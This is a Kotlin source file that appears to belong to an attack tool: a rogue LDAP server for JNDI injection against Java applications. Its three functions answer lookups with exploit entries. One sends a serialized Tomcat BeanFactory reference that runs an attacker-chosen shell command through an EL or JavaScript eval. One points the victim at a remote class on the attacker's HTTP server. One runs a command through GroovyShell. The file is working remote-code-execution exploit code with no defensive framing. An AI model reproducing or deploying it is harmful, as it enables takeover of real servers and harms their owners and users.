package ldap

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import org.apache.naming.ResourceRef
import util.Options
import util.base46cmd
import util.currentTime
import util.serialize
import java.net.URL
import javax.naming.StringRefAddr

fun LDAPServer.execByTomcat(result: InMemoryInterceptedSearchResult, base: String) {
    val jsStr = """
        var strs=new Array(3);
        if(java.io.File.separator.equals('/')) {
            strs[0]='/bin/bash';
            strs[1]='-c';
            strs[2]='${Options.command}';
        } else {
            strs[0]='cmd';
            strs[1]='/C';
            strs[2]='${Options.command}';
        }
        java.lang.Runtime.getRuntime().exec(strs);
    """.trimIndent()

    val payload = """
        {
            "".getClass().forName("javax.script.ScriptEngineManager")
            .newInstance().getEngineByName("JavaScript")
            .eval("$jsStr")
        }
    """.trimIndent().replace("\n", "")

    val ref = ResourceRef(
        "javax.el.ELProcessor", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=eval"))
        add(StringRefAddr("x", payload))
    }
    val entry = Entry(base).apply {
        addAttribute("javaClassName", "java.lang.String")  // could be any
        addAttribute("javaSerializedData", serialize(ref))
    }

    result.sendSearchEntry(entry)
    result.result = LDAPResult(0, ResultCode.SUCCESS)
}

fun LDAPServer.execByRef(result: InMemoryInterceptedSearchResult, base: String) {
    val classloaderUrl = "http://${Options.address}:${Options.httpPort}/"

    val entry = Entry(base)
    val javaFactory = base.substringAfterLast("/")

    val url = URL("$classloaderUrl$javaFactory.class")
    println("${currentTime()} [LDAPSERVER] Redirecting to $url")
    entry.run {
        addAttribute("javaClassName", "foo")
        addAttribute("javaCodeBase", classloaderUrl)
        addAttribute("objectClass", "javaNamingReference")
        addAttribute("javaFactory", javaFactory)
    }
    result.run {
        sendSearchEntry(entry)
        setResult(LDAPResult(0, ResultCode.SUCCESS))
    }
}

fun LDAPServer.execByGroovy(result: InMemoryInterceptedSearchResult, base: String) {
    val payload = "'${base46cmd(Options.command)}'.execute()"

    val ref = ResourceRef(
        "groovy.lang.GroovyShell", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=evaluate"))
        add(StringRefAddr("x", payload))
    }
    val entry = Entry(base).apply {
        addAttribute("javaClassName", "java.lang.String")  // could be any
        addAttribute("javaSerializedData", serialize(ref))
    }

    result.sendSearchEntry(entry)
    result.result = LDAPResult(0, ResultCode.SUCCESS)
}